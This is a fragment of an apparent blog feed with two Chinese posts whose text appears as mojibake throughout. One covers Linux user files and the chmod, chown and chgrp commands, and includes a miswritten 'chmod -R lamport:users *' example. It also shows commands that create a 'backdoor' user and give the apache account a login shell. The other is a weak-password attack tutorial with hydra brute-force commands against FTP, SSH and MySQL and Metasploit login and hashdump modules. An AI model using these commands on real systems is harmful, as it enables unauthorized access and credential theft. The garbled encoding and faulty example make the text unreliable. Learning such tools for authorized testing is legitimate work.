ï¼›<br>ç¬¬ä¸‰å­—æ®µï¼šGID<br>ç¬¬å››å­—æ®µï¼šç”¨æˆ·åˆ—è¡¨ï¼Œæ¯ä¸ªç”¨æˆ·ä¹‹é—´ç”¨,å·åˆ†å‰²ï¼›æœ¬å­—æ®µå¯ä»¥ä¸ºç©ºï¼›å¦‚æœå­—æ®µä¸ºç©ºè¡¨ç¤ºç”¨æˆ·ç»„ä¸ºGIDçš„ç”¨æˆ·åï¼›</p><h4 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h4><p>å¦‚ä¸‹ä¾‹å­ï¼š</p><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIMæˆªå›¾20200305221647.png" style="zoom:80%;"><p>ç¬¬ä¸€åˆ—ä¸ºè´¦æˆ·åç§°</p><p>ç¬¬äºŒåˆ—ä¸ºå¯†ç ï¼ˆè´¦æˆ·æœªè®¾ç½®å¯†ç æ—¶ä¸º!!ï¼Œè®¾ç½®å¯†ç ååŠ å¯†æ˜¾ç¤ºï¼‰</p><p>ç¬¬ä¸‰åˆ—ä¸ºä¸Šæ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´è·ç¦»1970å¹´01æœˆ01æ—¥å¤šå°‘å¤©</p><p>ç¬¬å››åˆ—ä¸ºå¯†ç æœ€çŸ­æœ‰æ•ˆå¤©æ•°ï¼Œ0è¡¨ç¤ºæ— é™åˆ¶</p><p>ç¬¬äº”åˆ—ä¸ºå¯†ç æœ€é•¿æœ‰æ•ˆå¤©æ•°ï¼ˆé»˜è®¤ä½99999å¤©ï¼Œå¯ä»¥ç†è§£ä¸ºæ°¸ä¸è¿‡æœŸï¼‰</p><p>ç¬¬å…­åˆ—ä¸ºå¯†ç è¿‡æœŸåçš„å®½é™å¤©æ•°ï¼ˆå¯†ç è¿‡æœŸåï¼Œé¢„ç•™å‡ å¤©ç»™è´¦å·ä¿®æ”¹å¯†ç ï¼Œæ­¤æ—¶å·²æ— æ³•ä½¿ç”¨æ—§å¯†ç ç™»å½•ï¼‰</p><p>ç¬¬å…«åˆ—ä¸ºè´¦æˆ·å¤±æ•ˆæ—¥æœŸï¼ˆä»1970å¹´01æœˆ01æ—¥èµ·å¤šå°‘å¤©åè´¦æˆ·å¤±æ•ˆï¼‰</p><p>ç¬¬ä¹åˆ—æš‚æ—¶ä¿ç•™æœªä½¿ç”¨</p><p>ç”±ç¤ºä¾‹å¯çŸ¥ï¼ŒåŠ å¯†çš„å¯†ç å…·æœ‰å›ºå®šæ ¼å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id$salt$encrypted</span><br></pre></td></tr></table></figure><p>idè¡¨ç¤ºåŠ å¯†ç®—æ³•ï¼Œ1ä»£è¡¨<code>MD5</code>ï¼Œ5ä»£è¡¨<code>SHA-256</code>ï¼Œ6ä»£è¡¨<code>SHA-512</code> saltè¡¨ç¤ºå¯†ç å­¦ä¸­çš„Salt,ç³»ç»Ÿéšæœºç”Ÿæˆ encryptedè¡¨ç¤ºå¯†ç çš„hash</p><h3 id="ä¸‰ä¸ªé‡è¦å‘½ä»¤"><a href="#ä¸‰ä¸ªé‡è¦å‘½ä»¤" class="headerlink" title="ä¸‰ä¸ªé‡è¦å‘½ä»¤"></a>ä¸‰ä¸ªé‡è¦å‘½ä»¤</h3><h4 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h4><p>Linux/Unix çš„æ–‡ä»¶è°ƒç”¨æƒé™åˆ†ä¸ºä¸‰çº§ : æ–‡ä»¶æ‹¥æœ‰è€…ã€ç¾¤ç»„ã€å…¶ä»–ã€‚åˆ©ç”¨ chmod å¯ä»¥è—‰ä»¥æ§åˆ¶æ–‡ä»¶å¦‚ä½•è¢«ä»–äººæ‰€è°ƒç”¨ã€‚</p><p><strong>ä½¿ç”¨æƒé™</strong> : æ‰€æœ‰ä½¿ç”¨è€…</p><h5 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-cfvR] [--help] [--version] mode file...</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h5><p>mode : æƒé™è®¾å®šå­—ä¸²ï¼Œæ ¼å¼å¦‚ä¸‹ :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-&#x3D;][rwxX]...][,...]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li>u è¡¨ç¤ºè¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…ï¼Œg è¡¨ç¤ºä¸è¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…å±äºåŒä¸€ä¸ªç¾¤ä½“(group)è€…ï¼Œo è¡¨ç¤ºå…¶ä»–ä»¥å¤–çš„äººï¼Œa è¡¨ç¤ºè¿™ä¸‰è€…çš†æ˜¯ã€‚</li><li>+ è¡¨ç¤ºå¢åŠ æƒé™ã€- è¡¨ç¤ºå–æ¶ˆæƒé™ã€= è¡¨ç¤ºå”¯ä¸€è®¾å®šæƒé™ã€‚</li><li>r è¡¨ç¤ºå¯è¯»å–ï¼Œw è¡¨ç¤ºå¯å†™å…¥ï¼Œx è¡¨ç¤ºå¯æ‰§è¡Œï¼ŒX è¡¨ç¤ºåªæœ‰å½“è¯¥æ–‡ä»¶æ˜¯ä¸ªå­ç›®å½•æˆ–è€…è¯¥æ–‡ä»¶å·²ç»è¢«è®¾å®šè¿‡ä¸ºå¯æ‰§è¡Œã€‚</li></ul><h5 id="å…¶ä»–å‚æ•°è¯´æ˜"><a href="#å…¶ä»–å‚æ•°è¯´æ˜" class="headerlink" title="å…¶ä»–å‚æ•°è¯´æ˜"></a>å…¶ä»–å‚æ•°è¯´æ˜</h5><ul><li>-c : è‹¥è¯¥æ–‡ä»¶æƒé™ç¡®å®å·²ç»æ›´æ”¹ï¼Œæ‰æ˜¾ç¤ºå…¶æ›´æ”¹åŠ¨ä½œ</li><li>-f : è‹¥è¯¥æ–‡ä»¶æƒé™æ— æ³•è¢«æ›´æ”¹ä¹Ÿä¸è¦æ˜¾ç¤ºé”™è¯¯è®¯æ¯</li><li>-v : æ˜¾ç¤ºæƒé™å˜æ›´çš„è¯¦ç»†èµ„æ–™</li><li>-R : å¯¹ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•è¿›è¡Œç›¸åŒçš„æƒé™å˜æ›´(å³ä»¥é€’å›çš„æ–¹å¼é€ä¸ªå˜æ›´)</li><li>â€“help : æ˜¾ç¤ºè¾…åŠ©è¯´æ˜</li><li>â€“version : æ˜¾ç¤ºç‰ˆæœ¬</li></ul><h4 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h4><p>Linux/Unix æ˜¯å¤šäººå¤šå·¥æ“ä½œç³»ç»Ÿï¼Œæ‰€æœ‰çš„æ–‡ä»¶çš†æœ‰æ‹¥æœ‰è€…ã€‚åˆ©ç”¨ chown å°†æŒ‡å®šæ–‡ä»¶çš„æ‹¥æœ‰è€…æ”¹ä¸ºæŒ‡å®šçš„ç”¨æˆ·æˆ–ç»„ï¼Œç”¨æˆ·å¯ä»¥æ˜¯ç”¨æˆ·åæˆ–è€…ç”¨æˆ·IDï¼›ç»„å¯ä»¥æ˜¯ç»„åæˆ–è€…ç»„IDï¼›æ–‡ä»¶æ˜¯ä»¥ç©ºæ ¼åˆ†å¼€çš„è¦æ”¹å˜æƒé™çš„æ–‡ä»¶åˆ—è¡¨ï¼Œæ”¯æŒé€šé…ç¬¦ã€‚ ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæŒ‡ä»¤åªæœ‰æ˜¯ç”±ç³»ç»Ÿç®¡ç†è€…(root)æ‰€ä½¿ç”¨ï¼Œä¸€èˆ¬ä½¿ç”¨è€…æ²¡æœ‰æƒé™å¯ä»¥æ”¹å˜åˆ«äººçš„æ–‡ä»¶æ‹¥æœ‰è€…ï¼Œä¹Ÿæ²¡æœ‰æƒé™å¯ä»¥è‡ªå·±çš„æ–‡ä»¶æ‹¥æœ‰è€…æ”¹è®¾ä¸ºåˆ«äººã€‚åªæœ‰ç³»ç»Ÿç®¡ç†è€…(root)æ‰æœ‰è¿™æ ·çš„æƒé™ã€‚</p><p><strong>ä½¿ç”¨æƒé™</strong> : root</p><h5 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown [-cfhvR] [--help] [--version] user[:group] file...</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h5><ul><li>user : æ–°çš„æ–‡ä»¶æ‹¥æœ‰è€…çš„ä½¿ç”¨è€… ID</li><li>group : æ–°çš„æ–‡ä»¶æ‹¥æœ‰è€…çš„ä½¿ç”¨è€…ç¾¤ä½“(group)</li><li>-c : è‹¥è¯¥æ–‡ä»¶æ‹¥æœ‰è€…ç¡®å®å·²ç»æ›´æ”¹ï¼Œæ‰æ˜¾ç¤ºå…¶æ›´æ”¹åŠ¨ä½œ</li><li>-f : è‹¥è¯¥æ–‡ä»¶æ‹¥æœ‰è€…æ— æ³•è¢«æ›´æ”¹ä¹Ÿä¸è¦æ˜¾ç¤ºé”™è¯¯è®¯æ¯</li><li>-h : åªå¯¹äºè¿ç»“(link)è¿›è¡Œå˜æ›´ï¼Œè€Œéè¯¥ link çœŸæ­£æŒ‡å‘çš„æ–‡ä»¶</li><li>-v : æ˜¾ç¤ºæ‹¥æœ‰è€…å˜æ›´çš„è¯¦ç»†èµ„æ–™</li><li>-R : å¯¹ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•è¿›è¡Œç›¸åŒçš„æ‹¥æœ‰è€…å˜æ›´(å³ä»¥é€’å›çš„æ–¹å¼é€ä¸ªå˜æ›´)</li><li>â€“help : æ˜¾ç¤ºè¾…åŠ©è¯´æ˜</li><li>â€“version : æ˜¾ç¤ºç‰ˆæœ¬</li></ul><h5 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><p>å°†æ–‡ä»¶ file1.txt çš„æ‹¥æœ‰è€…è®¾ä¸º users ç¾¤ä½“çš„ä½¿ç”¨è€… jessie :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown jessie:users file1.txt</span><br></pre></td></tr></table></figure><p>å°†ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•çš„æ‹¥æœ‰è€…çš†è®¾ä¸º users ç¾¤ä½“çš„ä½¿ç”¨è€… lamport :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R lamport:users *</span><br></pre></td></tr></table></figure><h4 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h4><p>Linux chgrpå‘½ä»¤ç”¨äºå˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„ã€‚</p><p>åœ¨UNIXç³»ç»Ÿå®¶æ—é‡Œï¼Œæ–‡ä»¶æˆ–ç›®å½•æƒé™çš„æŒæ§ä»¥æ‹¥æœ‰è€…åŠæ‰€å±ç¾¤ç»„æ¥ç®¡ç†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨chgrpæŒ‡ä»¤å»å˜æ›´æ–‡ä»¶ä¸ç›®å½•çš„æ‰€å±ç¾¤ç»„ï¼Œè®¾ç½®æ–¹å¼é‡‡ç”¨ç¾¤ç»„åç§°æˆ–ç¾¤ç»„è¯†åˆ«ç çš†å¯ã€‚</p><h5 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-cfhRv][--help][--version][æ‰€å±ç¾¤ç»„][æ–‡ä»¶æˆ–ç›®å½•...] æˆ– chgrp [-cfhRv][--help][--reference&#x3D;&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt;][--version][æ–‡ä»¶æˆ–ç›®å½•...]</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°è¯´æ˜-1"><a href="#å‚æ•°è¯´æ˜-1" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h5><p>-cæˆ–â€“changes æ•ˆæœç±»ä¼¼â€-vâ€å‚æ•°ï¼Œä½†ä»…å›æŠ¥æ›´æ”¹çš„éƒ¨åˆ†ã€‚</p><p>-fæˆ–â€“quietæˆ–â€“silent ã€€ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚</p><p>-hæˆ–â€“no-dereference ã€€åªå¯¹ç¬¦å·è¿æ¥çš„æ–‡ä»¶ä½œä¿®æ”¹ï¼Œè€Œä¸æ›´åŠ¨å…¶ä»–ä»»ä½•ç›¸å…³æ–‡ä»¶ã€‚</p><p>-Ræˆ–â€“recursive ã€€é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚</p><p>-væˆ–â€“verbose ã€€æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚</p><p>â€“help ã€€åœ¨çº¿å¸®åŠ©ã€‚</p><p>â€“reference=&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt; ã€€æŠŠæŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„å…¨éƒ¨è®¾æˆå’Œå‚è€ƒæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„ç›¸åŒã€‚</p><p>â€“version ã€€æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚</p><h5 id="å®ä¾‹-1"><a href="#å®ä¾‹-1" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><p>å®ä¾‹1ï¼šæ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„å±æ€§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp -v bin log2012.log</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log</span><br><span class="line">[root@localhost test]# chgrp -v bin log2012.log</span><br></pre></td></tr></table></figure><p>â€œlog2012.logâ€ çš„æ‰€å±ç»„å·²æ›´æ”¹ä¸º bin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼š å°†log2012.logæ–‡ä»¶ç”±rootç¾¤ç»„æ”¹ä¸ºbinç¾¤ç»„</p><p>å®ä¾‹2ï¼šæ ¹æ®æŒ‡å®šæ–‡ä»¶æ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„å±æ€§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp --reference&#x3D;log2012.log log2013.log</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log</span><br><span class="line">-rw-r--r-- 1 root root     61 11-13 06:03 log2013.log</span><br><span class="line">[root@localhost test]#  chgrp --reference&#x3D;log2012.log log2013.log </span><br><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log</span><br><span class="line">-rw-r--r-- 1 root bin      61 11-13 06:03 log2013.log</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼š æ”¹å˜æ–‡ä»¶log2013.log çš„ç¾¤ç»„å±æ€§ï¼Œä½¿å¾—æ–‡ä»¶log2013.logçš„ç¾¤ç»„å±æ€§å’Œå‚è€ƒæ–‡ä»¶log2012.logçš„ç¾¤ç»„å±æ€§ç›¸åŒ</p><h3 id="ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"><a href="#ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤" class="headerlink" title="ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"></a>ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤</h3><p><strong>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</strong></p><p>åˆ›å»ºä¸€ä¸ªåä¸ºshellçš„ç”¨æˆ·ï¼Œä¸åˆ›å»ºå®¶ç›®å½•ï¼Œshellä¸º<code>/bin/bash</code>ï¼ŒæŒ‡å®šUIDå·ä¸º8888ï¼Œæ³¨é‡Šä¸ºbackdoor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -c <span class="string">&quot;backdoor&quot;</span> -M -s /bin/bash -u 8888 shell</span><br></pre></td></tr></table></figure><p>è¯¦ç»†å‚æ•°ä¿¡æ¯ï¼š</p><table><thead><tr><th align="center">-g</th><th align="center">æŒ‡å®šæ‰€å±ç»„</th></tr></thead><tbody><tr><td align="center">-u</td><td align="center">æŒ‡å®šUIDå·</td></tr><tr><td align="center">-s</td><td align="center">æŒ‡å®šç™»å½•çš„shell</td></tr><tr><td align="center">-d</td><td align="center">æŒ‡å®šå®¶ç›®å½•</td></tr><tr><td align="center">-G</td><td align="center">æŒ‡å®šå±äºå¤šä¸ªç»„ï¼ˆé™„å±ç»„ï¼‰</td></tr><tr><td align="center">-M</td><td align="center">æŒ‡å®šä¸åˆ›å»ºå®¶ç›®å½•</td></tr><tr><td align="center">-m</td><td align="center">æŒ‡å®šåˆ›å»ºå®¶ç›®å½•</td></tr><tr><td align="center">-e</td><td align="center">è´¦å·ç»ˆæ­¢æ—¥æœŸï¼Œæ—¥æœŸæŒ‡å®šçš„æ ¼å¼ä¸ºMM/DD/YY</td></tr><tr><td align="center">-f</td><td align="center">è´¦å·è¿‡æœŸå‡ æ—¥åæ°¸ä¹…åœæƒã€‚å½“å€¼ä¸º0æ—¶è´¦å·ç«‹å³åœæƒï¼Œä¸º-1æ—¶åˆ™å…³é—­æ­¤åŠŸèƒ½ï¼Œé¢„è®¾å€¼ä¸º-1ã€‚</td></tr><tr><td align="center">-c</td><td align="center">æ³¨é‡Š</td></tr></tbody></table><p><strong>åˆ é™¤ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r admin</span><br></pre></td></tr></table></figure><ul><li>-r  åˆ é™¤ä¸»ç›®å½•å’Œé‚®ä»¶æ± </li><li>-f  å¼ºåˆ¶åˆ é™¤ï¼Œå³ä½¿ç™»å½•ä¸­</li></ul><p><strong>æ›´æ”¹å¯†ç </strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 123123|passwd --stdin useradmin -n 3 -x 30 -w 7 -i 5</span><br></pre></td></tr></table></figure><p>éäº¤äº’å¼ä¿®æ”¹å¯†ç ä¸º123123ï¼Œ3å¤©å†…ä¸èƒ½æ›´æ”¹å¯†ç ï¼Œ30å¤©åè¦æ±‚æ›´æ”¹å¯†ç ï¼Œå¯†ç è¿‡æœŸå‰7å¤©æé†’ï¼Œå¯†ç è¿‡æœŸå5å¤©ç¦ç”¨è´¦å·ã€‚</p><p>å‚æ•°ï¼š</p><table><thead><tr><th>-l</th><th>é”å®šç”¨æˆ·</th></tr></thead><tbody><tr><td>-U</td><td>è§£é™¤ç”¨æˆ·é”å®š</td></tr><tr><td>-d</td><td>åˆ é™¤ç”¨æˆ·å¯†ç </td></tr><tr><td>-S ï¼ˆå¤§å†™ï¼‰</td><td>æŸ¥çœ‹ç”¨æˆ·çŠ¶æ€</td></tr><tr><td>-n</td><td>è¡¨ç¤ºå¤šå°‘å¤©å†…ä¸èƒ½æ›´æ”¹å¯†ç </td></tr><tr><td>-x</td><td>è¡¨ç¤ºå¤šå°‘å¤©ä»¥åè¦æ±‚æ›´æ”¹å¯†ç </td></tr><tr><td>-w</td><td>è¡¨ç¤ºè´¦æˆ·å¯†ç è¿‡æœŸå‰å¤šå°‘å¤©æé†’</td></tr><tr><td>-i</td><td>è¡¨ç¤ºå¯†ç è¿‡æœŸåå¤šå°‘å¤©è´¦å·è¢«ç¦ç”¨</td></tr><tr><td>â€“stdin</td><td>éäº¤äº’å¼ä¿®æ”¹å¯†ç </td></tr></tbody></table><p><strong>æ›´æ”¹ç™»é™†shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/bash apache</span><br></pre></td></tr></table></figure><p>æ›´æ”¹apacheç”¨æˆ·ç™»å½•shellä¸º<code>/bin/bash</code></p><p>å‚æ•°ï¼š</p><ul><li>-s    æŒ‡å®šç™»å½•shell</li><li>-l     æ‰“å°shellåˆ—è¡¨å¹¶é€€å‡º</li></ul><p><strong>whoå‘½ä»¤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who -b    #åˆ—å‡ºä¸Šæ¬¡ç³»ç»Ÿå¯åŠ¨æ—¶é—´</span><br><span class="line">who -q    #åˆ—å‡ºæ‰€æœ‰å·²ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åä¸ç”¨æˆ·æ•°é‡</span><br><span class="line">who -u    #åˆ—å‡ºå·²ç™»å½•çš„ç”¨æˆ·</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/songgj/p/9115954.html">https://www.cnblogs.com/songgj/p/9115954.html</a></p><p><a href="https://blog.csdn.net/a1154490629/article/details/52190801">https://blog.csdn.net/a1154490629/article/details/52190801</a></p><p><a href="https://ipcmen.com/">https://ipcmen.com</a></p><p><a href="https://blog.csdn.net/weixin_34010566/article/details/93026151">https://blog.csdn.net/weixin_34010566/article/details/93026151</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿œç¨‹å¼±å£ä»¤æ”»å‡»å­¦ä¹ </title>
      <link href="2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å¼±å£ä»¤æ”»å‡»çš„ä¸€äº›æ–¹å¼ï¼</p><a id="more"></a><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ftp </span><br></pre></td></tr></table></figure><p>å‚æ•°è§£é‡Šï¼š</p><ol><li><p><code>-l root</code>     æŒ‡å®šçˆ†ç ´è´¦å·ä¸ºroot</p></li><li><p><code>-w 10</code>     æŒ‡å®šæ¯ä¸ªçº¿ç¨‹çš„å›åº”æ—¶é—´ä¸º10S</p></li><li><p><code>-P pwd.txt</code> æŒ‡å®šå¯†ç å­—å…¸ä¸ºpwd.txt</p></li><li><p><code>-t 10</code>      æŒ‡å®šçˆ†ç ´çº¿ç¨‹ä¸º10ä¸ª</p></li><li><p><code>-v</code>        æŒ‡å®šæ˜¾ç¤ºçˆ†ç ´è¿‡ç¨‹</p></li><li><p><code>-f</code>        æŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„IDå’Œå¯†ç çš„æ—¶å€™åœæ­¢ç ´è§£</p></li></ol><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>å¯ä»¥å…ˆä½¿ç”¨<code>auxiliary/scanner/ftp/ftp_version</code>å¯¹ç‰ˆæœ¬è¿›è¡Œæ¢æµ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.0.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200228151826.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°æ¢æµ‹å‡ºæ˜¯å¼€æ”¾çš„ï¼Œå¹¶è·å–åˆ°äº†ftpçš„bannerä¿¡æ¯</p><p>ç ´è§£å¯†ç å¯ä»¥ä½¿ç”¨<code>auxiliary/scanner/ftp/ftp_login</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /root/Desktop/pass.txt</span><br><span class="line"><span class="built_in">set</span> USERPASS_FILE /root/Desktop/name.txt</span><br><span class="line"><span class="built_in">set</span> THREADS 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="hydra-1"><a href="#hydra-1" class="headerlink" title="hydra"></a>hydra</h3><p>åŒæ ·å’Œftpç±»ä¼¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ssh</span><br></pre></td></tr></table></figure><h3 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h3><p>å¯ä»¥ç”¨<code>auxiliary/scanner/ssh/ssh_enumusers</code>è¿™ä¸ªæ¨¡å—æšä¸¾ç”¨æˆ·</p><p>å¯ä»¥ç”¨<code>auxiliary/scanner/ssh/ssh_login</code>è¿™ä¸ªæš´åŠ›ç ´è§£</p><p>ç”¨<code>auxiliary/scanner/ssh/ssh_version</code>æ¢æµ‹ç‰ˆæœ¬</p><p>ç”¨<code>auxiliary/scanner/ssh/ssh_login_pubkey</code>è¿›è¡Œå…¬é’¥ç ´è§£</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="hydra-2"><a href="#hydra-2" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mysql</span><br></pre></td></tr></table></figure><h3 id="msf-2"><a href="#msf-2" class="headerlink" title="msf"></a>msf</h3><p>ä½¿ç”¨<code>auxiliary/scanner/mysql/mysql_version</code>å¯ä»¥æ¢æµ‹ç‰ˆæœ¬</p><p>ä½¿ç”¨<code>auxiliary/admin/mysql/mysql_enum</code>å¯ä»¥è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œæ“ä½œç³»ç»Ÿåç§°ï¼Œæ¶æ„ï¼Œæ•°æ®åº“ç›®å½•ï¼Œæ•°æ®åº“ç”¨æˆ·ä»¥åŠå¯†ç å“ˆå¸Œå€¼</p><p>ä½¿ç”¨<code>auxiliary/scanner/mysql/mysql_login</code>ç ´è§£</p><p>ä½¿ç”¨<code>auxiliary/scanner/mysql/mysql_hashdump</code>è¿›è¡Œmysqlå“ˆå¸Œå€¼æšä¸¾</p><figure class="highlight 